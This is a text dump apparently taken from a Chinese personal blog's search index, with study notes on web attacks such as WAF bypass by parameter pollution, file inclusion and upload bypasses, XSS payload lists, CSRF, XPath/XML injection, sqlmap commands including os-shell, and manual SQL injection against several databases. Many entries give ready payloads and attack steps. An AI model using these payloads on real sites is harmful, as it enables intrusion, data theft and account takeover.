这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"},{"name":"文件解析","slug":"文件解析","permalink":"http://yoursite.com/tags/文件解析/"}]},{"title":"HTTP参数污染","date":"2017-04-18T02:06:23.435Z","path":"2017/04/18/Http参数污染/","text":"HTTP参数污染：我也不知道怎么解释。。语言水平不好。这种方法通常用来绕过WAF应用防火墙的检测。 PHP类型：http://127.0.0.1/test.php?id=7 or 1=1 in (SQLi)如果会出现“请停止攻击该网站”等提示。 这时我们可以尝试参数污染来绕过该WAF。当我们输入：?id=7&amp;id=（sqli)时 waf网络层会解析id=7， –&gt; 显示合法PHP应用层会解析 id=(sqli) –&gt; 注入成功 利用：把参数利用拼接符写在后面来绕过。 asp类型: ?id=1&amp;id=s&amp;id=e&amp;id=l&amp;id=e&amp;id=c&amp;id=t 如果它接受到两个参数值，它会拼接两个相同参数的值，因此你可以将被过滤的关键词拆分到两个参数中进行攻击从而绕过WAF。 如上面我写参数拼接在一起的就带有selec效果了。","tags":[]},{"title":"旁注攻击","date":"2017-04-15T09:42:25.351Z","path":"2017/04/15/旁注攻击/","text":"旁注攻击：同一台服务器上有多个网站。当A网站攻不下时，发现还有B网站也是同一个服务器时就尝试去攻占B网站。如果得到B网站的服务器权限也就相当于得到A网站的服务器权限。 过程： IP逆向查询：查询A域名的真实IP，然后反查IP得出IP（服务器）拥有的其它网站。（但这并不代表这是服务器所有的网站，因为这些都是通过收录得到的）注：注意查看是否使用了CDN 得到其它网站后，就渗透其它的网站，直至得到此网站的权限，后提权XXOO。。。 SQL跨库查询：垮库查询攻击假设A,B网站的同为一个服务器，且皆使用同一种数据库，A数据库为ADB，B数据库为BDB。如果B数据库在操作时可以对A数据库动刀，那么就称为跨库攻击。 其实和SQL注入差不多，例如，B网站注入成功并爆出数据库，那应该也爆出A网站的数据库（因为同为一个数据库软件），如果B网站的权限可以下载A或者查看A数据库的信息，那么久垮库攻击成功 目录越权：假如B网站上传了一个Webshell，在读取B网站的同时，发现可以去A网站的目录读取A网站的信息，则称为目录越权。假设还有写入权限，即可往A网站写入Shell。注：尽管只有读取权限，也可读取数据库信息，或者后台位置，或者利用代码审计进行攻击。 C段查询：https://www.phpinfo.me/bing.php子域名爆破：https://www.phpinfo.me/domain","tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"}]},{"title":"文件包含漏洞","date":"2017-04-15T03:51:16.310Z","path":"2017/04/15/文件包含漏洞/","text":"文件包含漏洞：服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。（其实不止PHP，ASP、JSP,、ASP.Net都存在文件包含漏洞）因为程序人员通常把重复使用的函数写到单个文件，在使用时就直接调用此文件，调用文件的过程就是文件包含。也因为PHP语言提供的文件包含太灵活和强大，所以漏洞或许多些。 PHP中有四个包含函数：incluede（）、include_once（）、require（）、require_once（）。 Include（）：函数包含文件时，只有代码执行到include()函数时将文件包含进来。发生错误时系统只给出一个警告，继续向下执行。 include_once（）：函数基本和include()相同，不过差别是：重复调用同一文件时，程序只调用一次。建议尽量使用include_once()函数不会因为重复包含文件而发生错误。 Require（）函数与include（）的差别是：1， 如果发生错误，函数会输出错误信息，并立即终止脚本的处理。2， 函数调用文件时，只要程序一执行，立即调用文件，而include()只有程序执行到该函数时，才调用。 require_once（）：此行语句和require（）语句类似，唯一区别就是如果该文件中的代码已经被包含，则不会再次包含。 文件包含分类：远程包含（LFI）、本地包含（RFI）。 区别：被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包含漏洞。 漏洞成因：在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就 可能导致意外的文件泄露甚至恶意的代码注入。 用法：正常URL：www.xxoo.com/action/n=file.php 假如根目录存在文件包含漏洞：www.xxoo.com/action/n=../../../../robots.txt（多../几个可以确保回到根目录）则把robots.txt文件读取出来，假如robots.txt符合PHP代码类型，则按照php代码类型去执行robots文件（其实无论哪个文件后缀，只要符合PHP类型，则按PHP解析文件。不然则以文本格式显示文件内容） 远程包含：www.xxoo.com/action/n=http://www.bbb.com/2/n=robots.txt 则输入 http://www.bbb.com网站的robots.txt文件 前提：都有包含漏洞。都开启了allow_url_include=on 注：1.其实有些版本还支持%00截断，例如www.xxoo.com/action/n=file.php%00.jpg。但是解析是以php解析（绕过后缀必须为指定后缀）。2.str_replace（）：将”http:// ”、”https://”、 ” ../”、”..\\”替换为空字符 绕过：双写绕过替换规则如page=hthttp://tp://192.168.1.1/robots.txt (应用于远程包含)3.当运用个别包含函数时，输入错误文件可爆出绝对路径","tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"}]},{"title":"社会工程学","date":"2017-04-15T03:51:14.416Z","path":"2017/04/15/社会工程学/","text":"社会工程学：俗称的社工。通过对人的本性，弱点，好奇心、信任、贪婪等心里陷阱进行欺骗的一种危害手段。俗话说的“攻城为下，攻心为上”这句话就是披露社会工程学的巨大力量。每一个强大的社工人员必然也是一个优良的“读心术”及沟通专家。 社工工作： 信息收集：比如说电话号码，名字，工作的ID号，什么手机号啊，出生日期，身份证号，邮箱，账号，常流浪的网页等等看似无关的信息。方法：Google Hack 、Whois、whois反查、网站的社工裤 沟通方法：“诚心以待”去获取员工的帮助。 伪造某人信息去代替他方法：在充分得到某领导信息后，向底层人员假装获取信息","tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://yoursite.com/tags/信息收集/"}]},{"title":"暴力破解","date":"2017-04-15T03:51:14.415Z","path":"2017/04/15/暴力破解/","text":"暴力破解：也可称为弱口令猜解，通常和社工（社会工程学）挂钩，过程需要有强大的字典。特殊情况不用，例如admin、admin123、admin888、adminadmin等若口令可手工猜解。弱口令字典在线生成网站：http://pass.cnseay.com/ 利用Burpsuit破解： 抓包 发送包到Intruder 选择变量Sniper：对变量一次进行破解（依照变量数进行所有字典的组合）Battering ram：对变量同时进行破解（密码和账号是同一个，直至轮完字典）Pitchfork：每个变量对应一个字典（组合为最小字典的数量）Cluster bomb：每个变量对应一个字典，并交集破解（A字典*B字典） 选择Payload type（这个看字典类型来选） Payload options 选择字典并导入，或者自己添加 点击Start attack 开始破解。 在弹出的Intruder attack 查看Length 的返回值，不一样长度则表现出返回的内容不同，所以字段不同，所以有可能是破解成功的Payload 其它工具还有PKAV等。PKAV：适用于爆破带有图片验证码的。但是本身不抓包，需配合抓包工具导请求包。 遇到特殊情况：1.假如存在验证Token值时：https://my.oschina.net/oby/blog/8475222.存在验证码时： 验证码固定：输入正确验证码后抓包，爆破登录账号和密码 验证码不点击确定时不重新获取：输入正确验证码后抓包，爆破登录账号和密码 3.验证码：不为图片（为数据时） 抓取网页源代码读取验证码位置。4.带有登录时效：设置线程爆破5.带有IP登陆次数限制：6.登陆的密码和账号进行过加密：需要知道加密的JS文件http://www.myhack58.com/Article/60/61/2017/83932.htm 骚套路:抓包删除验证码的验证信息,因为值为空（不错则对的套路），所以验证码正确。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"}]},{"title":"URL跳转与钓鱼","date":"2017-04-10T09:46:39.446Z","path":"2017/04/10/URL跳转与钓鱼/","text":"URL跳转：分为客户端跳转和服务端跳转。但是结果都是一样，跳到另外一个页面。 客户端跳转称为：URL重定向服务端跳转称为：URL转发 URL重定向例子： 当前URL为：www.xxoo.com/ppp.php 点击“登陆”按钮后 URL变为 ：www.xxoo.com/login.php 注：重定向状态码为：302 URL转发例子： 当前URL为：www.xxoo.com/ppp.php 点击“登陆”按钮后URL还是 ：www.xxoo.com/ppp.php （没变化） 不是所有的跳转都和上面有关，而是直接向服务器发送请求，例如： 例如：&lt;a href=”http://www.xxoo.com/new.jsp”&gt;新闻30分&lt;/a&gt;点击新闻30分按钮，跳到http://www.xxoo.com/new.jsp 页面。 和URL重定向区别：是直接向服务器发送请求，而不用间接的发送302状态码来跳转。（个人理解。。） 钓鱼：钓鱼网站：域名和某个页面做的非常相似，而且域名也相差无几。当受害者打开此网页，粗略的看了一下域名，发现页面也做的很像，然后输入账号密码，就被钓鱼了。 利用的相识字符：I(大写i)、l（小写L）和1D、O、0S、5M、N 绕过 恶意URL 策略：URL跳转：例如：http://www.baidu.com/test?=http://ta0bao.com（打开URL时中途会发送一个302重定向数据包） 注：URL转发不可作为URL跳转漏洞，因为URL转发无法进行域名的跳转，所以URL跳转漏洞也称为重定向漏洞。 php，ASP，ASP.Net 都有类似的重定向， 例如PHP的： &lt;?php $url=$_GET(‘url’) Header(“Location:$url”); ?&gt;","tags":[]},{"title":"上传篇","date":"2017-04-10T09:41:32.381Z","path":"2017/04/10/上传篇/","text":"上传：管理员用来管理网页，编辑网页的一个功能。也是攻击者用来上传Webshell的一个功能，没什么特殊情况一般存在于后台。当然也是有特殊的，例如注入上传，截包修改内容上传，修改个人头像时上传等。 其中上传漏洞一般为以下几种： 任意文件上传（无类型限制） IIS文件解析漏洞上传图片等文件（ma.asp;.jpg我也当是图片了。。） 利用文件编辑器的漏洞上传 抓包，构造文件上传漏洞。 如果是本地的JS验证，可关闭JS上传或者中间人攻击。 绕过上传漏洞： 客户端使用本地javascript对扩展名验证：1.本地构造上传HTML提交突破JS验证2.查看元素，删除onsubmit事件。3.先上传JPG后缀名，然后抓包再修改后缀名。如果本地检查的是MIME:则同理，抓包修改mime类型。注意修改类型的同时，修改Content-Length长度。4.利用空格（windows 会把空格给过滤。） 服务端扩展名检测：白盒：1.如果IIS可利用上述的IIS漏洞，2.cgi漏洞，3.%00截断上传，4.MIME验证：抓包修改 gif image/gif jpg image/jpeg php application/octet-stream asp application/x-asap png image/png 7z application/octet-stream txt text/plain rar application/octet-stream 5.运用::$DATA数据流上传，具体我也忘了，上次比赛GET到的。用法：如filename=1.php 修改为:filename=1.php::$DATA 黑盒：1.这类比较容易绕过，尝试一切后缀名，总有漏鱼之网。。例如cer，，asa2.尝试错误后缀名上传，例如“asp. （点）” “asp (空格)” 上传成功后windows系统自动剔除非法扩展名字符。然后剩下asp 目录验证：抓包时，如果看到路径，可尝试修改路径名，因为如果不存在路径文件名，系统一般会创建，然后利用IIS解析漏洞进行解析。 服务端使用重命名：1.抓包查看返回包2.查看源代码。 文本编辑器上传漏洞：FCKeditor（现更名为CKEditor）： 查看版本信息：/FCKediter/editor/dialog/fck_about.html 默认上传路径： FCKeditor/editor/filemanager/browser/default/browser.html FCKeditor/editor/filemanager/browser/default/connectors/test.html FCKeditor/editor/filemanager/browser/ upload/test.html FCKeditor/editor/filemanager/connectors/test.html FCKeditor/editor/filemanager/ uploadtest.html JSP 版：FCKeditor/editor/filemanager/browser/default/browser.html FCKeditor&lt;=2.4.3版本采用黑名单限制，但是忽略了以下后缀名：1.cer和asa等。2.而且存在任意文件上传漏洞(因为上传判断时，Media上传类型没定义，那上传时把URL改成————–/Upload.php?type=Media那上传时服务器就缺少文件后缀名验证机制。) 其它漏洞：asp.net二次传。建立畸形文件夹。 Fckeditor利用： 高版本过滤 “.“变”_“过滤Logo.asp;.jpg ==&gt; logo_asp;.jpg 其它编辑器漏洞:Ewebeditor/Ueditor/KindEditor/Xheditor Ewededitor:asp 默认密码：admin默认后台：ewebeditor/admin_login.asp默认数据库：ewebeditor/db/ewebeditor.mdb","tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"},{"name":"上传文件","slug":"上传文件","permalink":"http://yoursite.com/tags/上传文件/"}]},{"title":"逻辑错误漏洞","date":"2017-04-10T08:57:07.994Z","path":"2017/04/10/逻辑错误漏洞/","text":"逻辑漏洞：由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误.(程序不能处理一些逻辑上的漏洞，但并不代表程序会出错。)例如：这件在本地验证时值10元，传到服务端也是10元，那么问题来了，假如一件10元的物品被修改成1元传到服务器，服务端没有验证，是不是也是用1元来解析物品价格呢，逻辑漏洞就是这种。 出现地方：业务流程上。所以一般工具都无法识别。 例如：修改密码，找回密码，修改个人资料，物品购买时资金提交等。 绕过授权验证： 水平越权：相同级别用户之间的信息访问或修改 垂直越权：不同级别直接的用户的信息访问或修改（例如：用户和管理员） 例子：当访问我的个人信息时（假设我的账号为123456），URL为：www.qwerdf.com/user/Information?id=123456.php但当我把URL改为：www.qwerdf.com/user/Information?id=456.php也访问了账号456的人的信息，就称为水平越权。 当我把user改成admin,（假设某一位管理员ID=1）URL为：www.qwerdf.com/admin/Information?id=1.php时我也访问了管理员信息就称为垂直越权 当然，除了查看信息，删除，修改，增加等非正常操作都是越权。 密码找回逻辑漏洞：假设：www.xxoo.com/mima/back.asp 为一个密码找回页面当我填写找回密码的账号时，跳到身份验证这一步，获取验证码，填写正确后，就会跳到设置新密码那一步，然后完成。 但是如果身份验证那一步没设置好，就会出现密码找回的逻辑漏洞。 假设我在身份验证的时候抓包，发现包里有个验证手机号码为：186**。然后我把包里的号码修改为其它手机号，发现其它手机号接收到了验证码，我就可以凭借这验证码修改密码了。 这就是逻辑漏洞。 利用过程：1.输入其它账号，2.到身份验证时修改原本的验证号码的信息。3.得到返回的验证码后4.加以利用就可以做出修改了。 支付逻辑漏洞：原理同上。。都是在发送服务器端支付信息时修改里面的内容即可。 利用地方：1.商品数量2.商品价格3.商品折扣4.商品运费5.商品信息的中转、跳转、到支付接口时的参数。 （当类型判断不正确时，例如加入数量应该为整型，但是强行修改为字符型或其它不相关的类型时，有可能会导致系统崩毁或报错） 账户的恶意攻击： 假入A账户要冻结B账户的银行卡。操作如下： A账户输入B账户的银行卡信息，然后故意输错密码 当系统的安全机制（防爆破）提示还可输错4次时 A再进行输错的操作 B账户冻结 账户的恶意攻击成功实施。","tags":[]},{"title":"CSRF","date":"2017-04-10T08:52:49.589Z","path":"2017/04/10/CSRF/","text":"CSRF（跨站请求伪造）：也被称为XSRF，感觉和CSS被称为XSS差不多。CSRF与XSS区别：XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站（个人理解：是否需要直接获取用户权限。） CSRF成功要领：1.CMS开源（因为要知道网站页面的一点信息才能构造CSRF代码。）2．无需验证码验证3．无referer和token （token其实可以获取，referer用来防外链）4．管理员正在后台或者网站储存着有效Cookie5．….. ###1.查看该CMS源码，如我知道该源码为DWVA CMS，下载分析，发现修改管理员的地方没有Token验证，于是查看并构造代码： ###2.表单写入文本 ###3.修改action的值（#提交数据到本页，但如果是网站，应修改为网站的路径） 添加value（要操作的数值）。最终修改如下：保存为html格式。 ###4.打开并按按钮，成功发现成功修改，。然后我们可以把这玩意用邮件发送给目标站点的管理员并用社会工程学让他打开了。。顺便叫他按一下按钮。。 当然，还以当他打开时就自动提交，例如：添加JS机制。添加JS后修改的代码如下：其实这样是错误的。。因为没有执行”submit”按钮 想了好久想不通，找了个程序员大牛把代码修改了一下下，直接提交整个表单就得了，代码如下：注： js提交表单时不会带上 submit 按钮的值(因为没有被点击) 所有浏览器input 回车提交 w3c浏览器会带上submit按钮的值，ie6则不会带（所以把提交按钮的类型从submit换成了password.） 【只要点开这个文本就执行代码】 当然，，管理员对于未知文件怎么可能会轻易点开呢，所以我们还有个XSS+CSRF的利用方法（不知是不是这就是大佬们说的绝配。）前提：存在个XSS点。且熟悉ajax操作。因为不熟悉，所以。。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"}]},{"title":"XSS","date":"2017-04-10T08:11:39.110Z","path":"2017/04/10/XSS/","text":"Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。DOM型：没怎么了解，后续了解了再补充。javascript可以用来获取用户的Cookie、改变页面内容\\URL跳转等。Xss测试语句：12345678&lt;script&gt;alert(document.domain)&lt;/script&gt;\"/&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;\"（闭合Input标签）‘”()%26%25&lt;acx&gt;&lt;ScRiPt &gt;alert(9528)&lt;/ScRiPt&gt;（大小写绕过）\" onmouseover=alert(document.domain) align=\"left（需移动鼠标） “onclick=”alert(‘1’) （需要点击框才弹） &lt;img src=x onerror=alert(‘1’)&gt; &lt;body onload=alert(‘XSS’)&gt;... XSS例子:ARRAY_KEY_EXISTS():判断函数，如果name变量有值&amp;&amp;（与）不为空，则输出 “ Hello+&amp;_GET[‘name’] “。思路：无过滤，直接XSS代码可执行。 Str_replace():判断是否存在&lt;script&gt;,存在则把&lt;script&gt;替换成空格，然后再把输入的东西传递给name变量。再输出。思路：运用不带有&lt;script&gt;的Javascript语言去运行XSS代码，或者把&lt; script&gt;大小写。 Prog_replace()：和楼上类似。不过是执行一个正则表达式的搜索和替换。比楼上的高级，它会对用户所有的有效输入字符进行匹配检查，并将无效字符替换为空。思路：还是和楼上一样，只不过是不能运用这&lt;script&gt;这些字符，大小也不可以。但是我们可以用其它标签，比如body标签、img标签等。 checkToken：用来检查session_token是否过期。Htmlspecialchars()：把预定义字符（&amp;、”、&lt;、&gt;）转为HTML实体化的的函数（只有设置了：quotestyle 选项为ENT_QUOTES才会过滤单引号）。 **思路：1.因为没有过滤单引号，所以可以用 ‘onmouseover=alert’(1)’语句来弹窗，但是然并卵，， 2.跳出Htmlspecialchars()函数重新赋值给$name，例POC：但还是不行，因为你在构造的时候就已经被实体化了，后面的语句根本无法有效运行。 思路暂时没有，，等有想法再补充。 XSS绕过：1.利用空格或者回车2.对标签属性进行编码1&lt;IMG SRC=javascrip&amp;#116&amp;#58alert('xss')&gt; 3.大小写4.用eval函数进行十六进制和十进制的编码1&lt;img src=\"javascript:eval(string.formCharCode(97,98,99.....))\"&gt; 注：1.输入的东西是否被转移，看源代码即可2.对website有http-only、crossdomian.xml没有用3.可以明面上输入&lt; “ &gt; ‘ 等字符测试，看源代码有哪些没被转义就用哪些。4.需要大量测试（测试闭合标签） 经典：http://www.freebuf.com/articles/web/40520.html","tags":[]},{"title":"代码注入之XPath篇","date":"2017-04-08T09:39:58.589Z","path":"2017/04/08/代码注入之XPath篇/","text":"XPath：XML的路径语言（选取XML节点的一门语言）（和XML注入类似） 例如 user.xml文件是这么写的： &lt;users&gt; &lt;user&gt; &lt;firstname&gt;Ben&lt;/firstname&gt; &lt;lastname&gt;Elmore&lt;/lastname&gt; &lt;loginID&gt;abc&lt;/loginID&gt; &lt;password&gt;test123&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Shlomy&lt;/firstname&gt; &lt;lastname&gt;Gantz&lt;/lastname&gt; &lt;loginID&gt;xyz&lt;/loginID&gt; &lt;password&gt;123test&lt;/password&gt; &lt;/user&gt; 那XPath的一般查询语句是这样写的： //users/user[loginID/text()=’xyz’and password/text()=’123test’] 但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如 loginID = ‘xyz’ 和 password = ‘123test’，则该查询语句将返回 true。但如果用户传入类似 ‘ or 1=1 or ‘’=’ 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：//users/user[loginID/text()=’’or 1=1 or ‘’=’’ and password/text()=’’ or 1=1 or ‘’=’’] 这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲入技术获取最高权限帐号和其它重要文档信息。 利用手段：和SQL+XSS注入类似，闭合符合，然后构造POC利用位置：查询口","tags":[]},{"title":"代码注入之XML篇","date":"2017-04-08T09:38:42.897Z","path":"2017/04/08/代码注入之XML篇/","text":"XML：可扩展标识语言（和超文本标记语言有点类似，不过标签是带有自定义性质的，带有补充超文本语言的性质） （这个注入就是改写XML文件来利用。都需要闭合标签，然后插入数据，形式和SQL注入+XSS差不多） 报错语句: ‘ or (payload) or ‘‘ and (payload) and ‘‘ or (payload) and ‘‘ or (payload) and ‘=’‘(payload)’‘ or (payload) and ‘ 下面是一个保存注册用户信息为XML格式的例子： final String GUESTROLE = \"guest_role\"; ... //userdata是准备保存的xml数据，接收了name和email两个用户提交来的数据。 String userdata = \"&lt;USER role=\"+ GUESTROLE+ \"&gt;&lt;name&gt;\"+ request.getParameter(\"name\")+ \"&lt;/name&gt;&lt;email&gt;\"+ request.getParameter(\"email\")+ \"&lt;/email&gt;&lt;/USER&gt;\"; //保存xml userDao.save(userdata); 当上面这段代码没有任何过滤时，一个普通用户注册会是这样的↓ &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;USER role=\"guest_role\"&gt; &lt;name&gt;user1 &lt;/name&gt; &lt;email&gt;user1@a.com &lt;/email&gt; &lt;/USER&gt; 但攻击者注册时如果这样注册，构造利用代码如下： user1@a.com&lt;/email&gt;&lt;/USER&gt;&lt;USER role=\"admin_role\"&gt;&lt;name&gt;test&lt;/name&gt;&lt;email&gt;user2@a.com 最终用户注册后，数据就变成了↓： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;USER role=\"guest_role\"&gt; &lt;name&gt;user1 &lt;/name&gt; &lt;email&gt;user1@a.com&lt;/email&gt; &lt;/USER&gt; &lt;USER role=\"admin_role\"&gt; &lt;name&gt;lf&lt;/name&gt; &lt;email&gt;user2@a.com &lt;/email&gt; &lt;/USER&gt; ##很明显，多出了一条role=“admin_role”的管理员test。以达到攻击目的。## 防御：对关键字进行转义， 例： &amp; --&gt; &amp;amp; &lt; --&gt; &amp;lt; &gt; --&gt; &amp;gt; \" --&gt; &amp;quot; ' --&gt; &amp;#39; 具体函数：StringUtil.xmlencode（） 绕过：闭合（包括闭合函数）→重新构造整个代码，包括函数（当然这是我自己认为的，没实施过。。） 利用位置：注册口","tags":[]},{"title":"SQL注入之sqlmap工具使用","date":"2017-04-08T09:34:11.167Z","path":"2017/04/08/SQL注入之sqlmap工具使用/","text":"NMAP的使用： 常用命令：-u （后面接URL，判断注入，有注入则回显服务器信息） –dbs 查看所有数据库 –current-db 列出当前所用的数据库 –table 获取数据库表 （接 –D使用; 因为要知道是哪个数据库的表） –columns 获取表中的字段 （接 –T，-D使用，因为要知道哪个表那个数据库） –dump 获取字段内容 （接-C,-T,-D使用，和上同理。。） –r 利用文本（接编码转换文本或HTTP协议包） 以下为Mysql数据注入： -u www.xxx.com/qqq.php?id=1 存在注入，则爆出(网页信息)↓ -u www.xxx.com/qqq.php?id=1 –dbs 爆出所有数据库 选择bsgy数据库并爆表 -u www.xxx.com/qqq.php?id=1 –D “bsgy” –table 选择lefttree表，并爆字段-u www.xxx.com/qqq.php?id=1 –D “bsgy” -T “lefttree” –columns 爆字段内容-u www.xxx.com/qqq.php?id=1 –D “bsgy” -T “lefttree” –C “id,name” –dump Accessz注入：–table（直接猜表名）然后思路同理因为Access没有内置的数据库，而且只有一只，所以直接跑表 注：其它命令：1.测试所有用户权限：–privileges （接-U可指定用户）2.执行shell命令（需要知道物理路径且可写）： –os-cmd=”cmd命令” –os-shell3.post 提交：–data “post参数” （–forms可能会自动检测）4.显示详细参数：-v 0~6 （0~6代表信息等级，）5.cookies注入：–cookie –lever 3 （&gt;=2即可，3的话会检查User-agent和Referer）6.数据包注入：-r 要注入的文本 （文本的某一处加‘*’则选择在哪注入，不加则默认是头部注入，这方式适合伪静态注入）7.注入时使用编码：–tamper ‘py文本’ (适用黑名单绕过) 1.space2hash.py 2.base64encode.py 3.charencode.py8.延时注入： –delay 1(时间,可随意) –safe-freq 1(次数,可随意) 注入工具还有：穿山甲（pangolin） / Havij（小萝卜）。。。 编写人不同，注入方法也不通，都试试吧，可能某一个得呢。。","tags":[]},{"title":"SQL手工注入之mysql","date":"2017-04-08T09:17:21.383Z","path":"2017/04/08/SQL手工注入之mysql/","text":"mysql数据库 版本5.0↑，具有内置特定数据库（information_schema）。 最高权限为root 注入过程： 判断字段数 （order by） 匹配字段数：union select 1,2,3,4,5……. 利用内置函数暴数据库信息system_user() 系统用户名user() 用户名current_user() 当前用户名session_user() 链接数据库的用户名database() 数据库库名version() mysql数据库版本信息load_file() 转换成16或10进制 读取本地文件@@datadir 读取数据库路径@@basedir MYSQL安装路径@@version_compile_os 操作系统 查表：Union selec 1,group_concat(table_name) ,3 frominformation_schema.tables where table_schema= 数据库名的hex编码 表里面的列union select 1,group_concat(column_name),3 frominformation_schema.columns wheretable_name=表的HEX值 Union select 1,group_concat(列名),3 from 表名","tags":[]},{"title":"SQL手工注入之Oracle","date":"2017-04-08T09:14:16.455Z","path":"2017/04/08/SQL手工注入之Oracle/","text":"文章：http://www.2cto.com/article/201301/186345.html 注：字段位置应写为null..不可以用数字，因为Oracle是强类型数据库。必须表明类型，null就可避免类型限制。","tags":[]},{"title":"SQL手工注入之Access","date":"2017-04-08T09:11:27.016Z","path":"2017/04/08/SQL手工注入之Access/","text":"Access（数据库后缀名为：.mdb） 数据库结构： 判断是否存在注入（报错，“*”and/or;在网址最后输入（’；）,返回不正常的时候,说明是access类型的。反之，则是mssql类型） 判断数据库表名：and exists(select * from [表名]) 判断数据库列名：and exists(select [列名] from [表名]) 判断字节长度：order by 数字 联合查询注入：union select 1,2,… from [表名] 根据数字位置爆数据。 偏移注入（知道表名却不知道列名的情况下使用）：假设表名为admin。初始字段数为12 判断字段数（order by ） 爆显示位 用“”代替字符，计算代替字符的位数 当访问：http://127.0.0.1/0/Pro/P.asp?id=1513 UNION SELECT1,2,3,4,5,6,7, from admin 页面返回正确（说明admin表有7个字段）if：已经减去了五个字段则 = 5个字符2 x * = 10个字符12-10=2个字符 http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,a.id,b.id, * from (admin as a inner join admin as b on a.id=b.id) 如果不显示可以查看元素看看是不是隐藏了 真没有就二级偏移注入。。 再减7个字段 POC写成：UNION SELECT 1,2,a.id,b.id,c.id * from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=b.id) 三级。。。 四级。。。。。。。 跨库注入（知道数据库的绝对路径，然后猜表名）： and exists(select * from 数据库绝对路径.表名)","tags":[]},{"title":"SQL手工注入之SQL Server（mssql）","date":"2017-04-08T09:05:13.871Z","path":"2017/04/08/SQL手工注入之mssql/","text":"SQL Server（mssql）（一般搭配asp/asp.net(aspx)+mssql） 数据库结构： 权限：1.最高：sa（任何操作：文件管理/数据库操作/命令执行等）2.普通：db（文件管理，数据库操作等）3.最菜：public（数据库操作） 注入（手工判断）： And 1=1和and 1=2 组合判断 （用永真和永假判断） and (select count(*) from sysobjects)&gt;0 返回正常就是mssql数据库 版本信息查看：and 1=(select @@version)获取当前网站所用数据库库名：and 1=(select db_name())获取第一个数据库库名：and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)获取第二个数据库库名：and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name &lt;&gt; ‘第一个数据库库名’)获取第三个数据库库名：and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name &lt;&gt; ‘第一个数据库库名’ and name &lt;&gt; ‘第二个数据库库名’)其它同理。。。。 获取第一个当前使用的数据库表名：and 1=(select top 1 name from sysobjects where xtype=’u’)and 1=(select top 1 name from sysobjects where xtype=’u’ and name &lt;&gt;’第一个表名’)其它同理。。。 获取第一个当前使用的数据库的表里面的列名：and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = ‘表名’))获取第二个列明and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = ‘表名’)and name&lt;&gt; ‘第一个列名’)其它同理。。 获取列内容（假如表是users列是name）and 1=(select top 1 name from users)其它同理。。。。","tags":[]},{"title":"SQL注入之类型简介","date":"2017-04-08T08:59:30.913Z","path":"2017/04/08/SQL注入之类型简介/","text":"SQL注入原理：SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。（数据库语句没有进行严密的过滤，致使执行非法查询） SQL分类：1.数字型注入 2.字符型注入 3.搜索型注入 数字型:参数为数字。 例：www.test.com/test.php?id=123字符型：参数为字符（英文字符串） 例：www.test.com/test.php?id=asd搜索型：注入位置为搜索框例： 区别：SQL查询语句不相同。数字型：$sql=”select from A where id=$id”;字符型：$sql=”select from B where id=’$user ‘“;搜索型：$sql=”select * from user where username like ‘%$name%’ order by username”; 注入方式：GET，（请求头，URL位置）Post，（表单提交的注入，例：登陆框）Cookies,（利用Cookie 注入中转/手工编辑新的Cookies也可，即把参数写道Cookie里面（firebug里有编辑Cookie的插件）） 数据库分类：1). SQL Server （别名：mssql）2). Access3). Oracle4). MySql5). Sysbase6). Informix7). FoxPro8). PostgreSQL9). IBM 的DB2 前面四种是常见的，包含了大多数的中小企业，所以暂时先讲这四种，等哪天我成为大神再补充。后面的五种。。。就这样。 注：1.数据库不同，查询语句的连接符也不同 Mssql：“+” Oracle：“||” Mysql:：空格 Access：“&amp;” 灵活运用：or/and/xor/+ 后台，审查元素，name属性有意想不到的结果（写着字段） 下载CMS分析 基于布尔的SQL盲注—-构造逻辑判断基于时间的盲注—延时注入基于报错的盲注","tags":[]},{"title":"信息收集之CMS","date":"2017-04-08T08:40:20.964Z","path":"2017/04/08/信息收集之CMS/","text":"主要CMS：discuz 